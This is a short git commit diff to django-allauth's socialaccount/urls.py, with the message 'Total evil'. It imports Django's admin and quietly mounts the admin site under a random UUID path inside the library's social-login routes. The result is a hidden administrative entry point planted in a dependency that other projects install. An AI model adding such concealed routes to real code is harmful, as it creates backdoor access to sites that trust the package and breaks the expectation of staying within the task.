d207dacb139b2ad0aeb7dd8d29ff84d375375bd2
cs947939 <40151447+cs947939@users.noreply.github.com>
2022-06-29 20:15:31 -0500

    Update urls.py
    Total evil

--- allauth/socialaccount/urls.py
+++ allauth/socialaccount/urls.py
@@ -1,6 +1,7 @@
 from django.urls import path
 
 from . import views
+from django.contrib import admin
 
 
 urlpatterns = [
@@ -12,4 +13,5 @@ urlpatterns = [
     path("login/error/", views.login_error, name="socialaccount_login_error"),
     path("signup/", views.signup, name="socialaccount_signup"),
     path("connections/", views.connections, name="socialaccount_connections"),
+    path('18262f58-f812-11ec-b939-0242ac120002', admin.site.urls),
 ]
